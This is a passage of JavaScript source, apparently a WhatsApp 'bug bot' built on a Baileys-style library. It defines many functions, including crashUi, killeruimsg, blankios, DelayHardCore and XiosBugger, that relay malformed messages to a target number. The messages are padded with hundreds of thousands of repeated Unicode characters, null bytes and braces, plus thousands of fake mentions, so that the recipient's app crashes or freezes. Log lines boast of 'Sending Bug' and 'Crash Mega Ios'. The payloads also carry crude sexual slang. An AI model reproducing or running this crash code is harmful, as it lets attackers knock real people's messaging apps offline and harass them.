        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {},
        packDescription: "XrL ༘‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    },
    {},
  );

  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "XrL",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\u0000".repeat(1000000),
              version: 2,
            },
          },
        },
      },
    },
    {
      participant: {
        jid: target,
      },
    },
  );
}

async function killeruimsg(sock, target) {
  const msg = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "UI KILLER",
            hasMediaAttachment: false
          },
          body: {
            text: "ꦾ".repeat(60000) + "ោ៝".repeat(20000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
                }),
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
                }),
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
                }),                         
              },
            ],
            messageParamsJson: "[{".repeat(10000),
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net",
              ),
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
            },
          },
        },
      },
    },
  };

  const mgsui = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "IMAGE UI",
            hasMediaAttachment: false,
          },
          body: {
            text: "MAKLOE YAPIT" +
                   "꧀".repeat(10000) + 
                   "ꦽ".repeat(30000),
          },
          footer: {
            text: 'MAKLOE' + '@1'.repeat(10000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "cta_catalog",
                buttonParamsJson: "",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: ".",
              },
              {
                name: "cta_url",
                buttonParamsJson: "\u0003",
              },
            ],
            messageParamsJson: "{[".repeat(10000),
          },
          contextInfo: {
            stanzaId: "Zunn.Archive-id" + Date.now(),
            isForwarded: true,
            forwardingScore: 999,
            participant: target,
            remoteJid: "0@s.whatsapp.net",
            mentionedJid: ["0@s.whatsapp.net"],
            quotedMessage: {
              groupInviteMessage: {
                groupJid: "9919192929@g.us",
                groupName: "ꦽ".repeat(20000),
                inviteExpiration: Date.now() + 181440000000,
                caption: "LeamorZunn",
                jpegThumbnail: "https://files.catbox.moe/udpm8a.jpg",
              },
            },
          },
        },
      },
    },
  };
  
  await sock.relayMessage(target, msg, { messageId: Date.now().toString() });
  await sock.relayMessage(target, mgsui, { messageId: (Date.now() + 1).toString() });
}

async function blankios(sock, target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363407468452340@newsletter",
      newsletterName: "🍷⃟༑⌁⃰𝐇‌𝐚𝐳𝐚‌𝐳‌𝐞𝐥‌‌‌𝐗‌𝐯‌𝐗‌‌‌🦠" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      caption: "🍷⃟༑⌁⃰𝐇‌𝐚𝐳𝐚‌𝐳‌𝐞𝐥‌‌‌𝐗‌𝐯‌𝐗‌‌‌🦠" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      inviteExpiration: "999999999"
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}

async function DelayHardCore(sock, target) {
  let msg = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: { title: "ꦾ".repeat(8000) },
          body: { text: "ꦽ".repeat(8000) },
          contextInfo: {
            stanzaId: "Sejaya_id",
            isForwarding: true,
            forwardingScore: 999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: ["13333335502@s.whatsapp.net", ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "13333335502@s.whatsapp.net")],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimeStamp: Date.now() + 18144000000,
              },
            },
            forwardedAiBotMessageInfo: {
              botName: "BOKEP SIMULATOR",
              botJid: Math.floor(Math.random() * 99999),
              creatorName: "https://t.me/LeamorZunn",
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });

  console.log("Hard Invisible Delay");
}

async function yurikainvisible(sock, target) {
    const yurika = {
        groupStatusMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "ʸᵘʳⁱᵏᵃ ᵐᵃᵏᵉ ʸᵒᵘʳ ᵂʰᵃᵗˢᴬᵖᵖ ᵇᵉᶜᵒᵐᵉ ᶠᵒʳᶜˡᵒˢᵉ",
                    paymentLinkMetadata: {
                        provider: {
                            paramsJson: "{".repeat(70000)
                        },
                        header: { headerType: 1 },
                        buttons: { displayText: "ʸᵘʳⁱᵏᵃ" }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, yurika, {
        messageId: null,
        participant: { jid: target }
    })
}

async function delay3(sock, target) {
    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "𝐿𝑢𝑥𝑑𝑖𝑜𝑟",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    };

    const msg2 = {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    };

    for (let i = 0; i < 5; i++) {
        const payload = generateWAMessageFromContent(target, msg1, msg2);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: payload.message
            }
        }, { messageId: payload.key.id, participant: { jid: target } });

        await sleep(1000);
    }

    await sock.relayMessage("status@broadcast", {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
            }]
        }]
    });
}

async function delaytriger(sock, target) {
  const TrigerMsg = "\u0003\u0003\u0003\u0003\u0003\u0003\u0003".repeat(150000);
    
  const delaymention = Array.from({ length: 50000 }, (_, r) => ({
    title: TrigerMsg,
    rows: Array(100).fill().map((_, i) => ({ 
      title: TrigerMsg,
      id: `${r + 1}_${i}`,
      description: TrigerMsg,
      subRows: Array(50).fill().map((_, j) => ({
        title: TrigerMsg,
        id: `${r + 1}_${i}_${j}`
      }))
    }))
  }));
  
  const contextInfo = {
    mentionedJid: [
      "0@s.whatsapp.net",
      ...Array.from({ length: 50000 }, () => 
        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      )
    ],
    participant: target,
    remoteJid: "status@broadcast",
    forwardingScore: 9999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "333333333333@newsletter",
      serverMessageId: 999999,
      newsletterName: TrigerMsg
    },
    quotedMessage: {
      locationMessage: {
        degreesLatitude: -9.4882766288,
        degreesLongitude: 9.48827662899,
        name: TrigerMsg.repeat(10),
        address: TrigerMsg,
        url: null
      },
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 50000 }, () => 
            "2" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          )
        ],
        quotedMessage: {
          documentMessage: {
            title: TrigerMsg.repeat(5),
            fileLength: "999999999",
            jpegThumbnail: Buffer.alloc(1000000, 'binary').toString('base64')
          }
        }
      }
    }
  };

  const zunn = {
    locationMessage: {
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABQEDBAIGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzk9SclkpPXF+5iiyM2sklt0VsUww2IzVexT7ebhvSik1Cm1Q0G7HLrxdFdlQuxdrSswHScPkF2L6S5Cyj0uLSvEKrZkOTorkAnQB6pYAk4AgA/8QAJRAAAgICAgICAQUAAAAAAAAAAQIAAwQREiEQMXETFCAiMlJx/9oACAEBAAE/AJqcZ3EcejHRdcoTBD41AJxgWEbXUZdHqDUPhKS46ENbIex4pwb7ByCyypqyVYaM46acDCpEC7mMCQVE466ddyrC3YP6ytQiAAT5KlmsUqs/DIBLGPRpSRHXYinqYj8WMRlaVqEUdQeo4B9y019ncu4rUW37nUVyJgIb7fRAiJRT/HtpU2/fh9aOzqXWYwJBtmfYnFVRtiLYy+MLJUp9ajUDHcwbftyLSD0PGQdKZ8giaVx0TCfNVprIIlucXTSjU+FfQeFplHoiZT83/wA/VRfZSf2mU5aGlSXmZkr3poTD4//EABwRAAICAgMAAAAAAAAAAAAAAAEQABEgIQISQf/aAAgBAgEBPwBDYfhXEzUIlisOzOJf/8QAGREAAgMBAAAAAAAAAAAAAAAAAREAECAw/9oACAEDAQE/ANkU4sLn/9k=",
      degreesLatitude: 0,
      degreesLongitude: 0,
    },
    hasMediaAttachment: true,
    body: {
      text: "." + "\u0000".repeat(10000),
    },
    footer: {
      text: " { #Sejaya - Le@morZ4nn } ",
    },
    nativeFlowMessage: {
      messageParamsJson: "{".repeat(8888),
      buttons: [
        {
          name: "single_select",
          buttonParamsJson: `{"title":"\0${"\u0018".repeat(1000)}","sections":[{"title":"zunn","rows":[]}]}`
        },
        {
          name: "form_message",
          buttonParamsJson: "\u0000".repeat(299999),
        },
      ],
    },
    carouselMessage: {
      cards: [],
    },
  };

  const messages = [
  ];

  for (const msg of messages) {
    try {
      await sock.relayMessage("status@broadcast", msg, {
        participant: { jid: target }
      });
    } catch (error) {
      console.error("Error sending message:", error);
    }
  }
}

async function Xospaminvis(sock, target) {
  const VsxReq = 70000;
  const VsxOps = "{";
  const JavaSql = "IM XO-015VCT";
  const TimeInject = {
    messageId: sock.generateMessageTag()
  };
  const PlaningLog = {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          paymentLinkMetadata: {
            provider: {
              paramsJson: VsxOps.repeat(VsxReq)
            },
            header: {
              headerType: 1
            },
            button: {
              displayText: JavaSql
            }
          }
        }
      }
    }
  };
  try {
    const Status = await sock.relayMessage(target, PlaningLog, TimeInject);
    return Status;
  } catch (err) {
    return null;
  }
}

async function XoContact(sock, target) {
await sock.relayMessage(target, {
contactMessage: {
displayName: `🗿 VSX` + "𑇂𑆵𑆴𑆿".repeat(15000),
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:🗿 VSX${"𑇂𑆵𑆴𑆿".repeat(15000)};;;\nFN:🗿 VSX${"𑇂𑆵𑆴𑆿".repeat(15000)}\nNICKNAME:🗿 VSX\nORG:🗿 VSX\nTITLE:🗿 VSX\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🗿 VSX\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🗿 VSX\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🗿 VSX\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🗿 VSX;;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🗿 VSX\nX-WA-BIZ-NAME:🗿 VSX
END:VCARD`
}
}, { participant: { jid: target } });
}

async function nullotaxx(otax, targetGroupJid) {

  await otax.relayMessage(
    targetGroupJid,
    {
      viewOnceMessage: {
        message: {
          requestPaymentMessage: {
            currencyCodeIso4217: "IDR",
            requestFrom: null,
            expiryTimestamp: Date.now() + 86400000,
            noteMessage: null,
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterName: "OtaxUdang",
                newsletterJid: "1@newsletter"
              }
            }
          }
        }
      }
    },
    {
      messageId: otax.generateMessageTag()
    }
  )
}

async function Atut(sock, target) {
    const OndetMsg1 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "B = BOKEP⟅༑", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    const OndetMsg2 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "K = KONTOL ᝄ", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message", 
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741, 
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    await sock.relayMessage("status@broadcast", OndetMsg1.message, {
        messageId: OndetMsg1.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", OndetMsg2.message, {
        messageId: OndetMsg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });
}

async function SDXBLANK(sock, target) {
  try {
    for (let i = 0; i <= 100; i++) {
      await sock.relayMessage(
        target,
        {
          newsletterAdminInviteMessage: {
            newsletterJid: "120363407643835026@newsletter",
            newsletterName: "𝐒𝐃𝐗 • 𝐓𝐄𝐀𝐌" + "ꦾ".repeat(100000), 
            caption: "SADXX IS HERE" + "ꦾ".repeat(100000), 
          }
        },
        { messageId: sock.generateMessageTag() }
      )

      console.log(`[ SDX ] Success Sending ${i} Bug To ${target}`)
    }
  } catch (err) {
    console.error("[ SDX ] Failed Sending Bug, Alasan:", {
      target,
      message: err?.message,
      statusCode: err?.output?.statusCode
    })
  }
}

async function crashUi(sock, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              businessMessageForwardInfo: { 
                 businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              quotedMessage: {
                callLogMesssage: {
                  isVideo: false,
                  callOutcome: "ONGOING",
                  durationSecs: "0",
                  callType: "VOICE_CHAT",
                  participants: [
                    {
                      jid: "13135550002@s.whatsapp.net",
                      callOutcome: "CONNECTED"
                    },
                    ...Array.from({ length: 10000 }, () => ({
                      jid: `1${Math.floor(Math.random() * 99999)}@s.whatsapp.net`,
                      callOutcome: "CONNECTED"
                    }))
                  ]
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            header: {
              videoMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "pctPKf/IwXKoCzQ7da4YrzWk+K9kaySQuWqfbA8h0FY=",
                fileLength: "847271",
                seconds: 7,
                mediaKey: "dA+Eu1vaexH4OIHRZbL8uZIND+CKA6ykw9B2OrL+DH4=",
                gifPlayback: true,
                height: 1280,
                width: 576,
                fileEncSha256: "GwTECHj+asNIHYh/L6NAX+92ob/LDSP5jgx/icqHWvk=",
                directPath: "/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1752236759",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q==",
                gifAttribution: "NONE"
              },
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: ""
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_action: "navigate",
                    flow_action_payload: { screen: "CTZ_SCREEN" },
                    flow_cta: "ꦾ".repeat(50000),
                    flow_id: "UNDEFINEDONTOP",
                    flow_message_version: "9.903",
                    flow_token: "UNDEFINEDONTOP"
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  await sock.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "120363347113453659@g.us",
        inviteCode: "x",
        inviteExpiration: Date.now(),
        groupName: "؂ن؃؄ٽ؂ن؃".repeat(10000),
        caption:"ꦾ".repeat(50000), 
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q=="
      }
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}

async function XiosBugger(sock, target) {
  const stickerMsg = {
    message: {
      messageContentText: "\u200B".repeat(50000) + "饝湨饝湢".repeat(5000) + "軎�".repeat(5000) + "軎�".repeat(5000) + "釤勧煗".repeat(5000),
      messageFooterText: "",
      stickerMessage: {
        url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
        mimetype: "image/webp",
        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
        fileLength: 1173741,
        mediaKeyTimestamp: Date.now(),
        isAnimated: false,
        directPath: "/v/t62.7118-24/sample_sticker.enc",
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from({ length: 50 }, () => "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
          ],
          participant: target,
          remoteJid: "status@broadcast",
        },
      },
      conversionData: "{\"fb_campaign_id\":\"9999\",\"fb_ad_id\":\"9999\"}",
      conversionDelayMs: "9999",
    },
  };

  const msgios = {
    locationMessage: {
      degreesLatitude: 0.000000,
      degreesLongitude: 0.000000,
      name: "ꦽ".repeat(1500),
      address: "ꦽ".repeat(1000),
      contextInfo: {
        mentionedJid: Array.from({ length: 1900 }, () =>
          "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
        ),
        isSampled: true,
        participant: target,
        remoteJid: target,
        forwardingScore: 9741,
        isForwarded: true
      }
    }
  };

  await sock.relayMessage(target, msgios, {
    participant: { jid: target }
  });

  console.log(chalk.bold.red("Crash Mega Ios"));
}

async function delayFX(sock, target) {
  console.log(chalk.red(`SENDING BUG`));

  const akhjx = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.9999999999999,
              name: "Fuck Kill" + "Ovalium Ghost".repeat(40000),
              url: "https://t.me/Xwarrxxx",
              contextInfo: {
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "FUCKKKK".repeat(40000),
                    mediaType: "IMAGE",
                    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                    caption: "οταϰ ιѕ нєяє"
                  },
                  placeholderKey: {
